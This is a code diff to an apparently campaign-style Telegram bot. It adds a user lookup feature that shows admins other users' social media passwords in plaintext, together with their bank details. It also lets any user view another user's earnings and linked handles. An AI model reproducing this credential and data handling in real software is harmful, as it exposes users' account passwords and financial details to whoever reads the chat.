@@ -157,6 +157,65 @@ class Database:
                 )
                 await db.commit()
 
+    async def get_user_by_username(self, username: str):
+        clean_user = username.strip()
+        if not clean_user.startswith("@"):
+            clean_user = f"@{clean_user}"
+
+        if self.is_postgres:
+            async with self.pool.acquire() as conn:
+                row = await conn.fetchrow(
+                    """
+                    SELECT chat_id, telegram_username, views, money, payment_info
+                    FROM users
+                    WHERE LOWER(telegram_username) = LOWER($1)
+                    """,
+                    clean_user,
+                )
+                return dict(row) if row else None
+        else:
+            import aiosqlite
+            async with aiosqlite.connect(self.db_path) as db:
+                async with db.execute(
+                    """
+                    SELECT chat_id, telegram_username, views, money, payment_info
+                    FROM users
+                    WHERE LOWER(telegram_username) = LOWER(?)
+                    """,
+                    (clean_user,),
+                ) as cursor:
+                    row = await cursor.fetchone()
+                    if row:
+                        return {
+                            "chat_id": row[0],
+                            "telegram_username": row[1],
+                            "views": row[2],
+                            "money": row[3],
+                            "payment_info": row[4],
+                        }
+                    return None
+
+    async def get_user_social_accounts_full(self, chat_id: int) -> list[dict]:
+        if self.is_postgres:
+            async with self.pool.acquire() as conn:
+                rows = await conn.fetch(
+                    "SELECT platform, handle, password FROM social_accounts WHERE chat_id = $1 ORDER BY id ASC",
+                    chat_id,
+                )
+                return [dict(r) for r in rows]
+        else:
+            import aiosqlite
+            async with aiosqlite.connect(self.db_path) as db:
+                async with db.execute(
+                    "SELECT platform, handle, password FROM social_accounts WHERE chat_id = ? ORDER BY id ASC",
+                    (chat_id,),
+                ) as cursor:
+                    rows = await cursor.fetchall()
+                    return [
+                        {"platform": r[0], "handle": r[1], "password": r[2]}
+                        for r in rows
+                    ]
+
     async def upsert_user(self, chat_id: int, telegram_username: str):
         if self.is_postgres:
             async with self.pool.acquire() as conn:
@@ -383,6 +442,7 @@ class BotStates(StatesGroup):
     entering_password = State()
     entering_payment = State()
     entering_submission_link = State()
+    inspecting_user = State()
 
 # --- KEYBOARDS ---
 def get_main_menu_keyboard():
@@ -397,7 +457,10 @@ def get_main_menu_keyboard():
                 InlineKeyboardButton(text="💳 Payment", callback_data="menu_payment"),
                 InlineKeyboardButton(text="🔗 Submission Links", callback_data="menu_submissions"),
             ],
-            [InlineKeyboardButton(text="🏆 Leaderboard", callback_data="menu_leaderboard")],
+            [
+                InlineKeyboardButton(text="🏆 Leaderboard", callback_data="menu_leaderboard"),
+                InlineKeyboardButton(text="🔍 Check User", callback_data="menu_check_user"),
+            ],
         ]
     )
 
@@ -674,6 +737,13 @@ async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext)
                 text,
                 reply_markup=get_back_keyboard(),
             )
+        elif data == "menu_check_user":
+            await state.set_state(BotStates.inspecting_user)
+            await callback.message.edit_text(
+                "🔍 <b>Check User Data</b>\n\n"
+                "Please enter the Telegram username of the user you want to check (e.g., <code>@username</code>):",
+                reply_markup=get_back_keyboard(),
+            )
         elif data == "sub_new":
             await state.set_state(BotStates.entering_submission_link)
             await callback.message.edit_text(
@@ -854,6 +924,126 @@ async def process_submission_link(message: types.Message, state: FSMContext):
         disable_web_page_preview=True,
     )
 
+# --- USER DATA LOOKUP ---
+def format_user_data_card(
+    target_user: dict, socials: list, submissions: list, is_admin: bool
+) -> str:
+    uname = target_user["telegram_username"]
+    chat_id = target_user["chat_id"]
+    views = target_user["views"]
+    money = target_user["money"]
+    payment_info = target_user.get("payment_info") or "Not provided"
+
+    social_lines = []
+    if socials:
+        for s in socials:
+            if is_admin:
+                social_lines.append(
+                    f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code> (Pass: <code>{html.escape(s['password'])}</code>)"
+                )
+            else:
+                social_lines.append(
+                    f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code>"
+                )
+    else:
+        social_lines.append("• <i>No social accounts connected</i>")
+
+    if is_admin:
+        sub_lines = []
+        if submissions:
+            for sub in submissions[:5]:
+                sub_lines.append(
+                    f"• #{sub['id']}: <a href=\"{html.escape(sub['link'])}\">{html.escape(sub['link'])}</a> | <b>${sub['payment']:.2f}</b> ({html.escape(sub['status'])})"
+                )
+        else:
+            sub_lines.append("• <i>No submissions yet</i>")
+
+        return (
+            f"👤 <b>User Info: {html.escape(uname)}</b> (Admin View)\n\n"
+            f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n"
+            f"👁 <b>Total Views:</b> <b>{views:,}</b>\n"
+            f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
+            f"💳 <b>Payment / Bank Details:</b>\n"
+            f"<code>{html.escape(payment_info)}</code>\n\n"
+            f"📱 <b>Connected Social Accounts:</b>\n"
+            + "\n".join(social_lines)
+            + "\n\n"
+            f"🔗 <b>Recent Submissions ({len(submissions)} total):</b>\n"
+            + "\n".join(sub_lines)
+            + "\n\n"
+            f"⚙️ <b>Admin Actions:</b>\n"
+            f"<code>/update {uname} views money</code>"
+        )
+    else:
+        return (
+            f"👤 <b>User Info: {html.escape(uname)}</b>\n\n"
+            f"👁 <b>Total Views:</b> <b>{views:,}</b>\n"
+            f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
+            f"📱 <b>Connected Platforms:</b>\n" + "\n".join(social_lines)
+        )
+
+async def process_inspect_user(message: types.Message, state: FSMContext):
+    text = (message.text or "").strip()
+    if not text:
+        await message.answer(
+            "⚠️ Please enter a valid username (e.g., <code>@username</code>):",
+            reply_markup=get_back_keyboard(),
+        )
+        return
+
+    if not text.startswith("@"):
+        text = f"@{text}"
+
+    target_user = await db.get_user_by_username(text)
+    if not target_user:
+        await state.clear()
+        await state.set_state(BotStates.main_menu)
+        await message.answer(
+            f"❌ User <code>{html.escape(text)}</code> was not found in the database.",
+            reply_markup=get_main_menu_keyboard(),
+        )
+        return
+
+    is_admin = bool(message.from_user and message.from_user.id in ADMIN_IDS)
+    chat_id = target_user["chat_id"]
+    socials = await db.get_user_social_accounts_full(chat_id)
+    submissions = await db.get_user_submissions(chat_id)
+
+    response_text = format_user_data_card(target_user, socials, submissions, is_admin)
+
+    await state.clear()
+    await state.set_state(BotStates.main_menu)
+    await message.answer(
+        response_text,
+        reply_markup=get_main_menu_keyboard(),
+        disable_web_page_preview=True,
+    )
+
+async def info_command(message: types.Message):
+    parts = (message.text or "").split()
+    if len(parts) < 2:
+        await message.answer(
+            "⚠️ Format: <code>/info @username</code>\nExample: <code>/info @johndoe</code>"
+        )
+        return
+
+    target_username = parts[1].strip()
+    if not target_username.startswith("@"):
+        target_username = f"@{target_username}"
+
+    target_user = await db.get_user_by_username(target_username)
+    if not target_user:
+        await message.answer(f"❌ User <code>{html.escape(target_username)}</code> was not found.")
+        return
+
+    is_admin = bool(message.from_user and message.from_user.id in ADMIN_IDS)
+    chat_id = target_user["chat_id"]
+    socials = await db.get_user_social_accounts_full(chat_id)
+    submissions = await db.get_user_submissions(chat_id)
+
+    response_text = format_user_data_card(target_user, socials, submissions, is_admin)
+    await message.answer(response_text, disable_web_page_preview=True)
+
 # --- ADMIN COMMAND: UPDATE STATS ---
 async def update_stats_command(message: types.Message):
     if not message.from_user or message.from_user.id not in ADMIN_IDS:
@@ -963,6 +1153,7 @@ async def main():
     dp.message.register(start_command, Command("start"))
     dp.message.register(update_stats_command, Command("update"))
     dp.message.register(set_pay_command, Command("setpay"))
+    dp.message.register(info_command, Command("info"), Command("user"))
 
     # FSM Input States
     dp.message.register(process_username, BotStates.waiting_for_username)
@@ -970,6 +1161,7 @@ async def main():
     dp.message.register(process_password, BotStates.entering_password)
     dp.message.register(process_payment_info, BotStates.entering_payment)
     dp.message.register(process_submission_link, BotStates.entering_submission_link)
+    dp.message.register(process_inspect_user, BotStates.inspecting_user)
 
     # Callbacks
     dp.callback_query.register(
